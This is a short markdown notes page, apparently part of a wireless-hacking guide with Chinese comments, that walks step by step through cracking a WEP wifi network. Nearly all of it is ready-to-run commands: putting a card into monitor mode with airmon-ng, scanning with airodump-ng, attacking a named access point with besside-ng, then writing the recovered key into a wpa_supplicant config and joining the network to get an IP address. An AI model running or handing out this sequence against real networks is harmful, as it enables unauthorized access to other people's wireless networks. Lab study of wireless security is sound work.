WEP Crack
===
🔙 [MENU README](../README.md)


![](../_src/WEPCrack.png)
> 透過抓取IV完成破解
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --manufacturer --wps --band bga
# 找到WEP wifi
# #Data > 一直有在傳輸資料
# CH    > 1
# ENC   > 加密方式為WEP

sudo airodump-ng wlan0mon --manufacturer --wps --band bga --channel 1
```

Attack
```bash
sudo besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan0mon -v

# Got key for wifi-old [11:bb:33:cd:55]
```
Change Conf
```bash
# wpa_supplicant.conf

network={
    ssid="wifi-guest"
    key_mgmt=NONE
    wep_key0=11bb33cd55
    wep_tx_keyidx=0
}
```
Try Connect
```bash
# connect
sudo wpa_supplicant -D nl80211 -i wlan2 -c wpa_supplicant.conf
# get IP
sudo dhclient wlan2 -v

# http://192.168.19.1
```